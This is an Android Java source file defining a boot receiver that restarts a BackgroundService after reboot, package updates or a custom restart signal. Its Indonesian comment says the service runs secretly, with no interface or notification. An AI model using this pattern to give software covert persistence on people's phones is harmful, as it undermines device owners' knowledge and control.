package com.nex.panel;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * BootReceiver — Auto-start BackgroundService saat HP reboot.
 * Tidak ada UI, tidak ada notif, langsung jalankan service diam-diam.
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;
        // Boot, update, quickboot, atau restart dari AlarmManager
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)
                || "com.nex.panel.RESTART_SERVICE".equals(action)) {
            try {
                Intent service = new Intent(context, BackgroundService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(service);
                } else {
                    context.startService(service);
                }
            } catch (Exception ignored) {}
        }
    }
}
